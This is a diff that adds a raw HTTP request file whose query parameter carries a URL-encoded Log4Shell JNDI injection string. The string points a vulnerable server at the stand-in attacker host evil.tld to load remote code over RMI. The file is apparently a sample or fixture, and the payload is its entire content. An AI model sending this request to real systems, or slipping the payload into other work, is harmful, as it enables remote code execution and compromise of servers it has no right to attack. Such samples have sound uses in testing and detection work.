@@ -1,0 +1,4 @@
+GET /a?s=%24%7Bjndi%3Armi%3A%2F%2Fevil.tld%3A1099%2Fx%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
